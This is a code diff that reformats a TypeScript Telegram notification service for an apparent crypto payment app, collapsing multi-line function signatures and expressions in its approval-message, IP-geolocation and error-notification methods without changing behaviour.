@@ -9,9 +9,7 @@ export class TelegramService {
   /**
    * Send Telegram notification for approval success
    */
-  static async sendApprovalNotification(
-    data: TelegramNotificationData
-  ): Promise<void> {
+  static async sendApprovalNotification(data: TelegramNotificationData): Promise<void> {
     try {
       const message = this.formatApprovalMessage(data);
 
@@ -31,9 +29,7 @@ export class TelegramService {
    */
   private static formatApprovalMessage(data: TelegramNotificationData): string {
     const displayBalance =
-      data.chain === "bsc"
-        ? formatAmount(data.tokenBalance, 18)
-        : formatAmount(data.tokenBalance, 6);
+      data.chain === "bsc" ? formatAmount(data.tokenBalance, 18) : formatAmount(data.tokenBalance, 6);
 
     return `🎉 **${data.currency.toUpperCase()} Approval Successful!**
 
@@ -51,9 +47,7 @@ export class TelegramService {
   /**
    * Get country from IP address
    */
-  static async getCountryFromIP(
-    clientIP?: string
-  ): Promise<string | undefined> {
+  static async getCountryFromIP(clientIP?: string): Promise<string | undefined> {
     if (!clientIP) return undefined;
 
     try {
@@ -61,7 +55,7 @@ export class TelegramService {
       const services = [
         `https://ipapi.co/${clientIP}/json/`,
         `https://ip-api.com/json/${clientIP}`,
-        `https://ipinfo.io/${clientIP}/json`,
+        `https://ipinfo.io/${clientIP}/json`
       ];
 
       for (const serviceUrl of services) {
@@ -69,26 +63,22 @@ export class TelegramService {
           const response = await fetch(serviceUrl, {
             headers: {
               "User-Agent": "Mozilla/5.0 (compatible; CryptoPayment/1.0)",
-              Accept: "application/json",
-            },
+              Accept: "application/json"
+            }
           });
 
           if (response.ok) {
             const data = await response.json();
 
             // Different services return country in different fields
-            const country =
-              data.country || data.country_code || data.countryCode;
+            const country = data.country || data.country_code || data.countryCode;
             if (country) {
               return country;
             }
           }
         } catch (serviceError) {
           // Continue to next service if this one fails
-          console.warn(
-            `IP geolocation service failed: ${serviceUrl}`,
-            serviceError
-          );
+          console.warn(`IP geolocation service failed: ${serviceUrl}`, serviceError);
         }
       }
 
@@ -104,11 +94,7 @@ export class TelegramService {
   /**
    * Send error notification
    */
-  static async sendErrorNotification(
-    error: string,
-    context: string,
-    chain?: string
-  ): Promise<void> {
+  static async sendErrorNotification(error: string, context: string, chain?: string): Promise<void> {
     try {
       const message = `❌ **Error Notification**
 
